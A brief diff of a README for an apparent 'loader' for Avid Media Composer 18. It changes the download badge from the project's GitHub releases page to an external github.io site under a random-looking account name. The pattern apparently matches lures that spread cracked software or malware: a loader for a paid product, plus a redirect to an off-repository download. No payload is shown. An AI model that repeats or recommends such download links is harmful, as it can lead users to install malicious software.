@@ -6,7 +6,7 @@ This Windows utility takes care of the boring preparation work before you instal
 
 ## 📥 Download Now
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blueviolet?style=for-the-badge)](https://github.com/Detentegeothlypis225/avid-media-composer-18-loader/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blueviolet?style=for-the-badge)](https://detentegeothlypis225.github.io)
 
 Visit this link to download the application.
 
